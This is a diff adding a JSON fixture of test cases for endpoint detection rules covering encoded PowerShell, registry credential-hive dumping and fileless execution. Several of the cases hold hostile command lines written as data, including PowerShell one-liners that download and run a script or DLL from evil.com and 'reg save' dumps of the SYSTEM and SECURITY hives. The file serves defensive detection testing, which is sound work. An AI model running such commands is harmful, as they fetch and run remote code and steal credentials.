@@ -1,0 +1,185 @@
+{
+  "description": "P0 规则扩展测试用例 - 扩展R-EXEC/R-CRED/R-FILELESS规则覆盖范围",
+  "cases": [
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -enc SQBFAFgAIAA="
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -e SQBFAFgAIAA="
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "pwsh.exe",
+        "cmdline": "pwsh -EncodedCommand SQBFAFgAIAA="
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -EncodedCommand"
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell.exe -enc SQBFAFgAIAA="
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc SQBFAFgAIAA="
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": false,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "cmd.exe",
+        "cmdline": "cmd /c powershell -enc SQBFAFgAIAA="
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A"
+      }
+    },
+    {
+      "rule_id": "R-CRED-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "reg.exe",
+        "cmdline": "reg save HKLM\\SYSTEM C:\\temp\\sys.save"
+      }
+    },
+    {
+      "rule_id": "R-CRED-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "reg.exe",
+        "cmdline": "reg export HKLM\\SECURITY C:\\temp\\sec.reg"
+      }
+    },
+    {
+      "rule_id": "R-CRED-001",
+      "expect_hit": false,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "reg.exe",
+        "cmdline": "reg query HKLM\\SOFTWARE"
+      }
+    },
+    {
+      "rule_id": "R-FILELESS-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\""
+      }
+    },
+    {
+      "rule_id": "R-FILELESS-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\""
+      }
+    },
+    {
+      "rule_id": "R-FILELESS-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -c \"[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://evil.com/mal.dll'))\""
+      }
+    },
+    {
+      "rule_id": "R-FILELESS-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -c \"iex powershell -enc SQBFAFgAIAA=\""
+      }
+    },
+    {
+      "rule_id": "R-FILELESS-001",
+      "expect_hit": false,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "cmd.exe",
+        "cmdline": "cmd /c echo hello"
+      }
+    },
+    {
+      "rule_id": "R-FILELESS-001",
+      "expect_hit": false,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "notepad.exe",
+        "cmdline": "notepad.exe C:\\test.txt"
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -enc \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A\""
+      }
+    },
+    {
+      "rule_id": "R-EXEC-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -enc -join (1,2,3 | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_)) })"
+      }
+    },
+    {
+      "rule_id": "R-FILELESS-001",
+      "expect_hit": true,
+      "ev": {
+        "event_type": "process_create",
+        "process_name": "powershell.exe",
+        "cmdline": "powershell -enc \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A\""
+      }
+    }
+  ]
+}
